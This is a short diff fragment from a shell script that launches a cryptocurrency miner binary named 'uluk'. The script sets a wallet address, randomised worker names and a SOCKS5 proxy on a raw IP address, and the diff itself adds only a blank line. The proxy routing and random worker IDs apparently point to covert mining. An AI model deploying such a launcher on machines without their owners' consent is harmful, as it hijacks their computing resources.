@@ -8,3 +8,4 @@ WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
 WORKER=$(echo $(shuf -i 1-1000000 -n 1)BEH)
 PROXY=socks5://91.121.51.83:44388
 ./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+ 
